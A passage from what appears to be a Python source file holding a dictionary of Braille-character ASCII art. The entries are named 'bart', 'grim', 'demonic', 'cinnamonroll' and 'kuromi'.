        "⠀⢀⣾⠃⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡀⠀⠀⠀\n"
        "⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⠀\n"
        "⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀\n"
        "⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡀⠀\n"
        "⠀⢹⡆⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⢤⣤⣀⠀⣠⣤⠦⢤⣨⡷⠀\n"
        "⠀⠸⣷⠀⠀⠀⠀⠀⠀⢠⣾⡋⠀⠀⠀⠀⠉⢿⣉⠀⠀⠀⠈⠳⡄\n"
        "⠀⢀⣿⡆⢸⣧⠀⠀⠀⣾⢃⣄⡀⠀⠀⠀⠀⢸⡟⢠⡀⠀⠀⠀⣿\n"
        "⠀⣸⡟⣷⢸⠘⣷⠀⠀⣷⠈⠿⠇⠀⠀⠀⠀⢸⣇⣘⣟⣁⡀⢀⡿\n"
        "⠀⢿⣇⣹⣿⣦⡘⠇⠀⠘⠷⣄⡀⠀⠀⣀⣴⠟⠉⠉⠉⠉⠉⢻⡅\n"
        "⠀⠀⠈⡿⢿⠿⡆⠀⠀⠀⠀⠈⠉⠉⣉⣩⣄⣀⣀⣀⣀⣠⡾⠃\n"
        "⠀⠀⠀⠻⣮⣤⡿⠀⠀⠀⢀⣤⠞⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀\n"
        "⠀⠀⠀⠀⢸⠄⠀⠀⠀⣠⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄\n"
        "⠀⠀⠀⠀⣾⠀⠀⠀⢠⡏⠀⣀⡦⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧\n"
        "⠀⠀⠀⠀⡏⠀⠀⠀⢸⡄⠀⠛⠉⠲⣤⣀⣀⠀⠀⠀⠀⠀⣀⣴⡿\n"
        "⠀⢀⣀⣰⡇⠀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠀⠉⠉⣩⡿⠋⠉⠁⠀⠀\n"
        "⠀⣾⠙⢾⣁⠀⠀⠀⠀⠈⠛⠦⣄⣀⣀⣤⡞⠋⠀⠀⠀⠀⠀⠀⠀\n"
        "⢸⡇⠀⠀⠈⠙⠲⢦⣄⡀⠀⠀⠀⠀⠀⠀⢸⠋⠳⠦⣄⠀⠀⠀⠀\n"
        "⢿⡀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠓⢲⢦⡀⠀⢸⠀⠀⣰⢿⠀⠀⠀⠀\n"
        "⠀⠙⠳⣄⡀⠀⠀⠀⠀⠀⠀⢀⡟⠀⠙⣦⠸⡆⣰⠏⢸⡄⠀⠀⠀\n"
        "⠀⠀⠀⠀⠙⠳⢤⣄⣀⠀⠀⣾⠁⠀⠀⠈⠳⣿⣿⣄⣈⡇⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⢺⠇⠀⠀⠀⠀⠀⠈⠘⣧⠙⠃⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⢀⢀⢀⣀⠀⠀⠀⠀⠀⠀⡀⣈⡁⠀⠀⠀⠀\n"
    ),
"bart": (
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⡶⡄⣸⢷⣀⣴⣆⠀⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠙⠃⠀⠛⠁⠸⠟⢛⣧⡴⠚⡇⣀⡀⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠏⢹⣇⡤⣤⠀⠀⠀\n"
    "⠀⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⣠⠿⢴⡆⠀\n"
    "⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠠⠾⢤⣤\n"
    "⠀⠀⠀⠀⣠⢾⡯⣍⣉⢳⡀⠀⣀⣠⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⠀\n"
    "⠀⠀⢠⡾⠛⠻⣿⠲⢮⣕⣽⣻⣿⣿⣖⡦⣉⢣⡀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀\n"
    "⠀⢠⠏⠀⠀⠀⠀⠀⠀⡽⠋⠁⠀⠀⠨⣿⣮⡳⣣⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀\n"
    "⠀⢸⡀⠀⠀⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⢹⣿⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀\n"
    "⠀⠀⢱⢤⠞⠉⠉⠒⢧⠀⠀⠀⠀⠀⠀⠀⠀⣸⠇⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀\n"
    "⠀⢠⠏⠘⠦⣀⣀⠀⠈⠣⣀⠀⠀⠀⠀⣀⡴⠋⠀⠀⠀⢠⠏⠀⠀⠀⠀⠀⠀\n"
    "⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⣀⣀⡎⠀⠀⠀⠀⠀⠀⠀\n"
    "⠸⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠩⣯⣍⣹⠆⠀⠀⠀⠀⠀⠀\n"
    "⠀⠈⢹⡒⠒⣶⡒⠲⣤⠤⣀⣀⠀⠀⠀⠀⠀⠲⣄⣸⣧⡿⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠉⠉⠀⠙⡏⢻⣶⣾⣿⣽⣶⡀⠀⠀⠀⣸⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠀⠀⠀⠀⢹⡨⣿⣿⣿⣿⣿⣿⣆⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠀⠀⠀⠀⢠⠇⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠀⠀⠀⡴⠋⢰⣿⣿⡿⠿⢟⢿⡃⠀⢀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠀⠀⠀⠳⠤⣬⡉⠓⢣⠀⠈⠃⢹⡤⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠤⣼⣇⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣄⣀⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    ),

    "grim": (
        "⣿⠲⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⣸⡏⠀⠀⠀⠉⠳⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⡰⠋⢙⣿⣦⡀⠀⠀⠀⠀⠀\n"
        "⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣙⣦⣮⣤⡀⣸⣿⣿⣿⣆⠀⠀⠀⠀\n"
        "⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠀⣿⢟⣫⠟⠋⠀⠀⠀⠀\n"
        "⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣷⣷⣿⡁⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢸⣿⣿⣧⣿⣿⣆⠙⢆⡀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣤⣿⣿⣿⡟⠹⣿⣿⣿⣿⣷⡀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⣴⣿⣿⣿⣿⠏⢧⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢻⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠈⢳⡀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⣸⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⢳⡀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⢀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣼⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠛⠻⠿⣿⣿⣿⡿⠿⠿⠿⠿⢿⣿⣿⠏⠀\n"
    ),
     "demonic": (
        "⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡞⠀\n"
        "⠀⠀⢹⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀\n"
        "⠀⠀⠀⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡃⠀⠀\n"
        "⠀⠀⢰⡿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢿⣇⠀⠀\n"
        "⠀⠀⣾⠇⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠘⣿⠀⠀\n"
        "⠀⠀⣿⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⣀⡠⠔⠚⠉⠉⠀⠀⠀⠀⠉⠉⠑⠲⢤⣀⠀⠀⠀⠀⠀⠀⠀⢀⠏⠀⣿⡇⠀\n"
        "⠀⠘⣿⠀⠀⠹⡄⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣦⡀⠀⠀⠀⢠⠎⠀⠀⣿⡇⠀\n"
        "⠀⠀⣿⡤⠼⠁⠈⢢⣄⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣄⣠⡔⠃⠀⠣⣤⣿⠃⠀\n"
        "⠀⠀⢻⣷⣀⠀⣠⣾⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⣄⡀⣀⣼⡟⠀⠀\n"
        "⠀⠀⠀⢿⣿⣿⣿⣿⡟⢀⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⡀⢻⣿⣿⣿⣿⡿⠁⠀⠀\n"
        "⣄⠀⠀⠀⠻⣿⣿⣿⣤⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣤⣿⣿⣿⠟⠁⠀⠀⣠\n"
        "⠘⣧⡀⠀⠀⣾⣿⢿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡿⣿⣷⠀⠀⢀⣼⠇\n"
        "⠀⢹⣳⡀⠀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⠀⢀⣾⡟⠀\n"
        "⠀⠘⣿⢳⡀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⡞⣼⠃⠀\n"
        "⠀⠀⣿⡄⢣⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡜⢠⣿⠀⠀\n"
        "⠀⠀⢻⣇⠈⢻⡀⠀⢹⣦⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⡏⠀⢀⡿⠁⢸⡟⠀⠀⠀\n"
        "⠀⠀⠀⢻⠀⠈⡇⠀⠀⠉⠫⢯⠙⠻⢄⠀⠀⠀⢀⠀⠀⠀⠀⣀⠀⠀⠀⡠⠞⠋⣩⠍⠉⠀⠀⢸⠁⠀⡟⠀⠀⠀\n"
        "⠀⠀⠀⣼⠀⢸⣇⠀⠀⠀⠀⠈⠳⠤⠤⣵⣤⡔⠃⠀⠀⠀⠀⠈⠢⣤⣮⠤⠤⠞⠁⠀⠀⠀⠀⢸⡇⠀⣷⠀⠀⠀\n"
        "⠀⠀⠀⢻⡀⢸⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⢠⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡇⠀⡿⠀⠀⠀\n"
        "⠀⠀⠀⠘⣷⣼⣿⡿⠲⣄⡀⠀⠀⠀⣀⡜⠁⠀⢠⠇⠀⠀⠸⡀⠀⠈⢣⣀⡀⠀⠀⠀⣠⡖⢻⣿⣧⣾⠃⠀⠀⠀\n"
        "⠀⠀⠀⠀⠈⠙⣿⣿⠀⣧⠉⠛⠛⠉⠘⠳⢤⣀⢸⡀⠀⠀⠀⡇⣀⡤⠞⠁⠉⠛⠛⠉⣼⠀⣾⣿⠛⠁⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⢹⣿⡀⢸⡆⢀⡞⡏⠑⠦⣀⠀⠙⢧⣤⣤⡼⠋⠁⣀⢴⠊⢹⠳⡀⢠⡏⠀⣿⡟⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⢿⣇⠈⣧⡼⣾⣿⣴⡇⠀⣍⠒⠦⠭⠭⠴⠒⣹⠀⢸⣦⣿⣗⠳⢸⠁⣸⡿⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠘⣿⡀⢿⢀⡿⣿⣿⣿⣼⣿⣦⣷⣴⣦⣾⣶⣿⣧⣿⣿⣿⢷⡀⣿⢀⣿⠃⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠹⣧⢸⠘⣅⡙⠀⣿⡟⣿⣿⣿⣿⣿⣿⣿⠻⣿⠁⢃⣨⠇⡇⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣎⡆⠈⢧⠀⠙⠀⠻⠃⠏⠹⠏⠹⠈⠏⠀⠋⠀⡼⠁⢠⢣⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡃⠀⠈⣿⢿⣤⣆⣰⣦⣰⣆⣴⣆⣰⣄⡾⣿⠁⠀⠈⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⢸⡆⠉⢁⣤⠤⠤⠴⠤⣤⣈⠉⢠⡏⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠀⠀⠉⠛⠉⠀⠀⠀⠀⠀⠀⠉⠛⠉⠀⠀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    ),

 "cinnamonroll": (
    "⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣷⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⣰⣿⠟⠉⠀⠀⠀⠀⠉⠻⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀\n"
    "⠀⢸⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⢸⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠻⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣦⠀⠀⠀⢀⣴⡿⠛⠛⣻⣿⣶⣶⣶⣶⣶⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣤⣄⡀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠀⠹⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣧⡄⣰⣿⡿⠇⠐⣻⡟⠋⠁⢠⣶⠀⠀⠈⢿⣿⣶⣶⣤⣀⠀⠀⠀⣀⣀⠀⠀⠀⠀⢀⣤⣾⡿⠟⠛⠛⠛⠻⣿⣷⣄⠀⠀\n"
    "⠀⠀⠀⠀⠀⠈⢿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⠏⠀⠀⢸⣟⠀⠀⠀⠈⠻⠷⣦⣴⠿⠁⠹⣯⠉⠛⠿⣿⡿⠛⠻⣿⣦⣠⣾⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠻⣿⣆⠀\n"
    "⠀⠀⠀⠀⠀⠀⠀⠙⢻⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠿⠟⠛⠛⠛⠛⠛⠛⠛⠷⢶⣤⣄⡀⠀⠀⠀⣿⠇⠀⠀⠀⠙⠧⣀⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡆\n"
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣷⣤⡀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⢷⣤⣾⠟⠀⢀⣀⣤⡴⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣗\n"
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣶⣤⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡟⠛⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠃\n"
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠏⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⠋⠀\n"
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⠃⠀⠀⢀⣾⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⡿⠛⠁⠀⠀\n"
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡏⣀⣄⣀⡈⢿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣴⣾⡿⠟⠋⠁⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡲⣌⢧⡛⢷⡄⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⢹⣷⣶⣶⣶⠶⠶⠿⠿⠟⠛⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣮⣒⠹⠚⠁⣀⡀⣀⣽⡷⠖⠲⣤⣸⡇⠀⠀⠀⠀⠙⠿⠟⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣿⣿⢶⣾⣿⣻⢟⣯⣿⣿⣶⣄⠀⠀⠀⠀⠀⢠⡖⢯⣛⠳⡶⣄⢀⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣶⣿⣻⣧⣿⣿⣿⣟⣿⣿⣦⣤⣄⣀⣀⣈⣉⣳⣌⣻⣴⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣛⣿⣛⣿⣿⠈⠉⢉⣩⣿⡿⠛⠛⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣾⣟⣿⣟⣿⣿⣿⣶⣾⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    "⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⣻⠿⣿⣿⣿⡿⢟⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
),
  "kuromi":( """
      
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⣤⡴⠞⠋⠉⠀⠀⠀⠀⠀⠀⠈⠉⠙⠳⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣦⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
